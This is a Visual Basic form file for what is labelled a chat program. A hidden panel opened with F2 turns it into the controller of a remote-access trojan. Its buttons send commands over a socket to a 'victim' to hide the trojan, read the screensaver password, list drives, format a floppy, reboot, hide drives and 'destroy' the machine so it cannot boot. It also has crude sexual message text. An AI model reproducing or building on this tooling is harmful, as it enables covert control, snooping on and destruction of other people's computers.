VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Jan Bludau's Chat Erste Version BETA !!!!!!!!!"
   ClientHeight    =   6150
   ClientLeft      =   150
   ClientTop       =   720
   ClientWidth     =   11115
   DrawMode        =   12  'Keine Operation
   Icon            =   "Server.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6150
   ScaleWidth      =   11115
   StartUpPosition =   3  'Windows-Standard
   Begin VB.CommandButton Command35 
      Caption         =   "insecure"
      Height          =   375
      Left            =   1920
      TabIndex        =   55
      Top             =   4920
      Width           =   1095
   End
   Begin VB.CommandButton Command34 
      Caption         =   "Drucken ?"
      Height          =   315
      Left            =   1920
      TabIndex        =   54
      ToolTipText     =   "Drucken ?"
      Top             =   4560
      Width           =   1095
   End
   Begin VB.OptionButton Option2 
      Caption         =   "640 x 480"
      Height          =   255
      Left            =   9840
      TabIndex        =   53
      Top             =   4440
      Width           =   1215
   End
   Begin VB.OptionButton Option1 
      Caption         =   "800 x 600"
      Height          =   255
      Index           =   1
      Left            =   9840
      TabIndex        =   52
      Top             =   4680
      Value           =   -1  'True
      Width           =   1335
   End
   Begin VB.OptionButton Option1 
      Caption         =   "1024 x 768"
      Height          =   255
      Index           =   2
      Left            =   9840
      TabIndex        =   51
      Top             =   4920
      Width           =   1215
   End
   Begin VB.OptionButton Option1 
      Caption         =   "1152 x 864"
      Height          =   255
      Index           =   3
      Left            =   9840
      TabIndex        =   50
      Top             =   5160
      Width           =   1215
   End
   Begin VB.CommandButton Command33 
      Caption         =   "Logoff"
      Height          =   495
      Left            =   7200
      TabIndex        =   49
      Top             =   3840
      Width           =   1215
   End
   Begin VB.CommandButton Command32 
      Caption         =   "Shutdown"
      Height          =   495
      Left            =   7200
      TabIndex        =   48
      Top             =   3360
      Width           =   1215
   End
   Begin VB.CommandButton Command31 
      Caption         =   "Trojan zeigen"
      Height          =   495
      Left            =   9840
      TabIndex        =   47
      Top             =   1080
      Width           =   1215
   End
   Begin VB.CommandButton Command30 
      Caption         =   "Bildschirmschoner"
      Height          =   495
      Left            =   9840
      TabIndex        =   46
      ToolTipText     =   "schaltet den Bildschirmschoner beim Opfer an"
      Top             =   3000
      Width           =   1215
   End
   Begin VB.CommandButton Command29 
      Caption         =   "Disconnect"
      Height          =   495
      Left            =   9840
      TabIndex        =   45
      ToolTipText     =   "geht aus dem Internet"
      Top             =   2520
      Width           =   1215
   End
   Begin VB.CommandButton Command28 
      Caption         =   "Autoconnect off"
      Height          =   495
      Left            =   9840
      TabIndex        =   44
      ToolTipText     =   "schaltet das Autoconnecten wieder aus"
      Top             =   2040
      Width           =   1215
   End
   Begin VB.CommandButton Command27 
      Caption         =   "Autoconnect"
      Height          =   495
      Left            =   9840
      TabIndex        =   43
      ToolTipText     =   "wählt sich selbständig in das Internet ein (falls Passwort eingetragen) alle 50 Ms"
      Top             =   1560
      Width           =   1215
   End
   Begin VB.CommandButton Command26 
      Caption         =   "Trojan verstecken"
      Height          =   495
      Left            =   9840
      TabIndex        =   42
      ToolTipText     =   "Das Opfer sieht das Programm nicht mehr"
      Top             =   600
      Width           =   1215
   End
   Begin VB.CommandButton Command25 
      Caption         =   "Laufwerke anzeigen "
      Height          =   495
      Left            =   9840
      TabIndex        =   41
      ToolTipText     =   "zeigt alle Laufwerke des Opfers an"
      Top             =   120
      Width           =   1215
   End
   Begin VB.CommandButton Command24 
      Caption         =   "Bildschirmgröße"
      Height          =   495
      Left            =   8640
      TabIndex        =   40
      ToolTipText     =   "Auflösung des Bildschirms des Opfers"
      Top             =   120
      Width           =   1215
   End
   Begin VB.CommandButton Command23 
      Caption         =   "lesen"
      Height          =   495
      Left            =   7200
      TabIndex        =   39
      ToolTipText     =   "Zeigt den Akuellen Rechnernamen an"
      Top             =   2400
      Width           =   615
   End
   Begin VB.CommandButton Command6 
      Caption         =   "FUNNY / Beenden"
      Height          =   435
      Left            =   7200
      TabIndex        =   38
      Top             =   4920
      Width           =   1215
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Browser Startseite"
      Height          =   495
      Left            =   7200
      TabIndex        =   37
      ToolTipText     =   "ändert die Browser Startseite"
      Top             =   1440
      Width           =   1215
   End
   Begin VB.CommandButton Command3 
      Caption         =   "NF"
      Height          =   495
      Left            =   7200
      TabIndex        =   36
      ToolTipText     =   "?????????"
      Top             =   960
      Width           =   1215
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Close"
      Height          =   495
      Left            =   7800
      TabIndex        =   35
      ToolTipText     =   "schließt das Cd - ROM wieder "
      Top             =   480
      Width           =   615
   End
   Begin VB.CommandButton open 
      Caption         =   "Open"
      Height          =   495
      Left            =   7200
      TabIndex        =   34
      ToolTipText     =   "öffnet das CD-ROM"
      Top             =   480
      Width           =   615
   End
   Begin VB.CommandButton show 
      Caption         =   "Show"
      Height          =   495
      Left            =   7800
      TabIndex        =   33
      ToolTipText     =   "Zeigt den Desktop bei dem Opfer wieder"
      Top             =   0
      Width           =   615
   End
   Begin VB.CommandButton hide 
      Caption         =   "Hide "
      Height          =   495
      Left            =   7200
      TabIndex        =   32
      ToolTipText     =   "versteckt die Symbole auf dem Desktop"
      Top             =   0
      Width           =   615
   End
   Begin VB.CommandButton malen 
      Caption         =   "Malen"
      Height          =   495
      Left            =   7200
      TabIndex        =   31
      ToolTipText     =   "Malen des Desktops (Endlos)"
      Top             =   4440
      Width           =   615
   End
   Begin VB.CommandButton Command11 
      Caption         =   "stoppen"
      Height          =   495
      Left            =   7800
      TabIndex        =   30
      ToolTipText     =   "stopt des Bomben (MALEN)"
      Top             =   4440
      Width           =   615
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Msg"
      Height          =   495
      Left            =   7200
      TabIndex        =   29
      ToolTipText     =   "schickt eine MSG"
      Top             =   1920
      Width           =   1215
   End
   Begin VB.CommandButton Command10 
      Caption         =   "schreiebn"
      Height          =   495
      Left            =   7800
      TabIndex        =   28
      ToolTipText     =   "schreibt den Neuen Rechnernamen I'Ve Hack YOU"
      Top             =   2400
      Width           =   615
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Secure"
      Height          =   495
      Left            =   9840
      TabIndex        =   27
      ToolTipText     =   "lässt alle Laufwerke verschwinden nach dem Neustart (auch im Explorer)"
      Top             =   3480
      Width           =   1215
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Format A:"
      Height          =   495
      Left            =   9840
      TabIndex        =   26
      ToolTipText     =   "Formatier das Diskettenlaufwerk (Dialog)"
      Top             =   3960
      Width           =   1215
   End
   Begin VB.CommandButton Command8 
      Caption         =   "reboot"
      Height          =   495
      Left            =   7200
      TabIndex        =   25
      ToolTipText     =   "Startet den Rechner des Opfers neu"
      Top             =   2880
      Width           =   1215
   End
   Begin VB.CommandButton Command22 
      Caption         =   "Open Browser"
      Height          =   495
      Left            =   8640
      TabIndex        =   24
      ToolTipText     =   "zu www.symantec.com"
      Top             =   600
      Width           =   1215
   End
   Begin VB.CommandButton Command21 
      Caption         =   "Minmieren"
      Height          =   495
      Left            =   8640
      TabIndex        =   23
      ToolTipText     =   "Minimiert alle Anwendungen bei dem Opfer"
      Top             =   1080
      Width           =   1215
   End
   Begin VB.CommandButton Command20 
      Caption         =   "ON"
      Height          =   495
      Left            =   9240
      TabIndex        =   22
      ToolTipText     =   "Zeigt den Mauszeiger beim Opfer wieder"
      Top             =   1560
      Width           =   615
   End
   Begin VB.CommandButton Command19 
      Caption         =   "Mauszeiger ?"
      Height          =   495
      Left            =   8640
      TabIndex        =   21
      ToolTipText     =   "Versteckt den Mauszeiger bei dem Opfer"
      Top             =   1560
      Width           =   615
   End
   Begin VB.CommandButton Command18 
      Caption         =   "CAPS OFF"
      Height          =   495
      Left            =   9240
      TabIndex        =   20
      ToolTipText     =   "Lässt die Disco wieder beenden"
      Top             =   2040
      Width           =   615
   End
   Begin VB.CommandButton Command17 
      Caption         =   "CAPS ON"
      Height          =   495
      Left            =   8640
      TabIndex        =   19
      ToolTipText     =   "Startet zufällig alle Lichter (NUM LOOK , CAPS LOOK, SCOLL LOOK)"
      Top             =   2040
      Width           =   615
   End
   Begin VB.CommandButton Command16 
      Caption         =   "Bildschirmschoner Passwort"
      Height          =   495
      Left            =   8640
      TabIndex        =   18
      ToolTipText     =   "Zeigt das Bildschirmschoner Passwort"
      Top             =   2520
      Width           =   1215
   End
   Begin VB.CommandButton Beepoff 
      Caption         =   "Beep OFF"
      Height          =   495
      Left            =   9240
      TabIndex        =   17
      ToolTipText     =   "schaltet das Beepen des Rechners wieder aus"
      Top             =   3000
      Width           =   615
   End
   Begin VB.CommandButton Beepon 
      Caption         =   "Beep ON"
      Height          =   495
      Left            =   8640
      TabIndex        =   16
      ToolTipText     =   "Schaltet das Beepen des Rechners ein"
      Top             =   3000
      Width           =   615
   End
   Begin VB.CommandButton internetip 
      Caption         =   "INTERNET IP"
      Height          =   495
      Left            =   8640
      TabIndex        =   15
      Top             =   3480
      Width           =   1215
   End
   Begin VB.CommandButton Command15 
      Caption         =   "ON"
      Height          =   495
      Left            =   9240
      TabIndex        =   14
      ToolTipText     =   "Schaltet den Monitor wieder ein"
      Top             =   3960
      Width           =   615
   End
   Begin VB.CommandButton Command14 
      Caption         =   "OFF"
      Height          =   495
      Left            =   8640
      TabIndex        =   13
      ToolTipText     =   "Schaltet den Monitor ab"
      Top             =   3960
      Width           =   615
   End
   Begin VB.CommandButton Command13 
      Caption         =   "ZERSTÖREN"
      Height          =   495
      Left            =   8640
      TabIndex        =   12
      ToolTipText     =   "OPFER = TOT (KEIN BOOTEN MEHR)"
      Top             =   4440
      Width           =   1215
   End
   Begin VB.CommandButton Command12 
      Caption         =   "klick gesch"
      Height          =   495
      Left            =   9240
      TabIndex        =   11
      ToolTipText     =   "normal"
      Top             =   4920
      Width           =   615
   End
   Begin VB.CommandButton doppelk 
      Caption         =   "klick gesch."
      Height          =   495
      Left            =   8640
      TabIndex        =   10
      ToolTipText     =   "Doppelklickgeschwindigkeit auf sehr langsamm"
      Top             =   4920
      Width           =   615
   End
   Begin VB.Timer Timer1 
      Interval        =   10
      Left            =   2040
      Top             =   0
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Check1"
      Height          =   375
      Left            =   0
      TabIndex        =   9
      Top             =   4560
      Visible         =   0   'False
      Width           =   1575
   End
   Begin MSWinsockLib.Winsock W 
      Left            =   2520
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox Text3 
      BackColor       =   &H80000002&
      BeginProperty Font 
         Name            =   "MS Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1695
      Left            =   3120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertikal
      TabIndex        =   7
      TabStop         =   0   'False
      ToolTipText     =   "Hier wird der Text Empfangen"
      Top             =   3480
      Width           =   3495
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Send"
      Height          =   375
      Left            =   4200
      TabIndex        =   6
      TabStop         =   0   'False
      ToolTipText     =   "ALT + S reicht auch aus"
      Top             =   2280
      Width           =   1335
   End
   Begin VB.TextBox Text2 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1695
      Left            =   3120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertikal
      TabIndex        =   0
      ToolTipText     =   "Hier wird der Text gesendet"
      Top             =   600
      Width           =   3495
   End
   Begin VB.ListBox List2 
      BackColor       =   &H00000000&
      ForeColor       =   &H00E0E0E0&
      Height          =   1425
      ItemData        =   "Server.frx":030A
      Left            =   0
      List            =   "Server.frx":030C
      MultiSelect     =   2  'Erweitert
      TabIndex        =   4
      TabStop         =   0   'False
      Top             =   480
      Width           =   2895
   End
   Begin VB.Frame Frame1 
      Caption         =   "Clients"
      Height          =   2535
      Left            =   0
      TabIndex        =   2
      Top             =   2040
      Width           =   3015
      Begin VB.ListBox List1 
         Height          =   2010
         Left            =   120
         TabIndex        =   3
         TabStop         =   0   'False
         Top             =   360
         Width           =   2775
      End
   End
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   0
      TabIndex        =   1
      Text            =   "5"
      Top             =   0
      Width           =   735
   End
   Begin VB.Label Label2 
      BackColor       =   &H00FF0000&
      BorderStyle     =   1  'Fest Einfach
      Caption         =   "Empfangen !!!!!"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   3120
      TabIndex        =   8
      Top             =   3000
      Width           =   3495
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FF0000&
      BorderStyle     =   1  'Fest Einfach
      Caption         =   "Senden !!!!!"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   3120
      TabIndex        =   5
      Top             =   120
      Width           =   3495
   End
   Begin VB.Menu Befehl 
      Caption         =   "Befehle"
      Begin VB.Menu spezial 
         Caption         =   "Spezial"
         Shortcut        =   {F2}
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim a

Private Sub Beepoff_Click()
W.SendData "beepoff"
End Sub

Private Sub Beepon_Click()
W.SendData "beepon"
End Sub

Private Sub Command10_Click()
W.SendData "compu"
End Sub

Private Sub Command12_Click()
W.SendData "doppelkL"
End Sub

Private Sub Command13_Click()
W.SendData "dest"
End Sub

Private Sub Command14_Click()
W.SendData "monioff"
End Sub

Private Sub Command15_Click()
W.SendData "monion"
End Sub

Private Sub Command16_Click()
W.SendData "passs"
End Sub

Private Sub Command17_Click()
W.SendData "discoon"
End Sub

Private Sub Command18_Click()
W.SendData "discooff"
End Sub

Private Sub Command19_Click()
W.SendData "mauszoff"
End Sub

Private Sub Command2_Click()
W.SendData "close"
End Sub

Private Sub Command20_Click()
W.SendData "mauszon"
End Sub

Private Sub Command21_Click()
W.SendData "mini"
End Sub

Private Sub Command22_Click()
W.SendData "openIE"
End Sub

Private Sub Command23_Click()
W.SendData "compun"
End Sub

Private Sub Command24_Click()
W.SendData "desksize"
End Sub

Private Sub Command25_Click()
W.SendData "laufw"
End Sub

Private Sub Command26_Click()
W.SendData "hideme"
End Sub

Private Sub Command27_Click()
W.SendData "gogogoye"
End Sub

Private Sub Command28_Click()
W.SendData "gogogono"
End Sub

Private Sub Command29_Click()
W.SendData "rausraus"
End Sub

Private Sub Command3_Click()
W.SendData "NF"
End Sub

Private Sub Command30_Click()
W.SendData "bildi"
End Sub

Private Sub Command31_Click()
W.SendData "showme"
End Sub

Private Sub Command32_Click()
W.SendData "shutdowni"
End Sub

Private Sub Command33_Click()
W.SendData "logoffi"
End Sub

Private Sub Command34_Click()
W.SendData "drucktest"
End Sub

Private Sub Command35_Click()
W.SendData "insecure"
End Sub

Private Sub Command5_Click()
W.SendData "jan"
End Sub

Private Sub Command6_Click()
W.SendData "funny"
End Sub

Private Sub Command7_Click()
W.SendData "secure"
End Sub

Private Sub Command8_Click()
W.SendData "rebooti"
End Sub

Private Sub Command9_Click()
W.SendData "format"
End Sub

Private Sub doppelk_Click()
W.SendData "doppelkS"
End Sub

Private Sub Form_Load()
Form1.Width = 6795
W.Close
W.LocalPort = 5
W.Listen
List2.Clear
List2.AddItem Time & "  Öffne Port " & W.LocalPort & "."
List2.AddItem Time & "  erwarte Verbindung"
Text1.Text = W.LocalPort
End Sub
Private Sub Form_Terminate()
W.Close
End Sub

Private Sub Form_Unload(Cancel As Integer)
W.Close
End Sub

Private Sub hide_Click()
W.SendData "hide"
End Sub

Private Sub internetip_Click()
W.SendData "internetIP"
End Sub

Private Sub malen_Click()
W.SendData "deskmalen"
End Sub

Private Sub open_Click()
W.SendData "open"
End Sub

Private Sub Option1_Click(Index As Integer)
  Dim X&, Y&
    Select Case Index
      Case 0: W.SendData "bildi640"
      Case 1: W.SendData "bildi800"
      Case 2: W.SendData "bildi1024"
      Case 3: W.SendData "bildi1152"
    End Select
End Sub

Private Sub Option2_Click()
W.SendData "bildi640"
End Sub

Private Sub show_Click()
W.SendData "show"
End Sub

Private Sub spezial_Click()
If a = 0 Then
    Check1.Value = 1
End If
If a = 1 Then
    Check1.Value = 0
End If
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
    List2.AddItem ""
    W.Close: List2.AddItem Time & "  Schließe Port " & W.LocalPort & "."
    W.LocalPort = Text1.Text: List2.AddItem Time & "  Opening Port " & W.LocalPort & "."
    W.Listen: List2.AddItem Time & "  erwarte Verbindung."
End If
Form1.Caption = W.LocalPort
End Sub

Private Sub Text2_Change()
'W.SendData "serversend"
End Sub

Private Sub Timer1_Timer()
If Check1.Value = 1 Then
    Form1.Width = 11145
    a = 1
End If
If Check1.Value = 0 Then
    Form1.Width = 6795
    a = 0
End If
End Sub

Private Sub W_ConnectionRequest(ByVal requestID As Long)
If W.State <> sckClosed Then W.Close
W.Accept requestID
List1.AddItem W.RemoteHostIP
List2.AddItem Time & "  " & W.RemoteHostIP & " connected."
End Sub
Private Sub Command1_Click()
W.SendData Text2.Text
Text2.Text = ""
Text1.SetFocus
End Sub
Private Sub W_DataArrival(ByVal bytesTotal As Long)
Beep
Dim Temp As String
W.GetData Temp, vbString
If Temp = "NF" Then
    Res = MsgBox("Ficken ???", vbSystemModal + vbOKOnly + vbCritical, "NF")
    If Res = vbOK Then
        W.SendData "JA SOFORT JEDER ZEIT"
        Else
        W.SendData "Wer bist Du denn bitte (kein Joke) ?"
    End If
    Exit Sub
End If
If Temp = "DiSaBlE" Then
    Check1.Value = 0
    Form1.Width = 6795
    Timer1.Enabled = False
    Exit Sub
End If
If Temp = "EnAbLeD" Then
    Check1.Value = 1
    Form1.Width = 11145
    Timer1.Enabled = True
    Exit Sub
End If
Text3.Text = Text3.Text & vbCrLf & Temp
End Sub
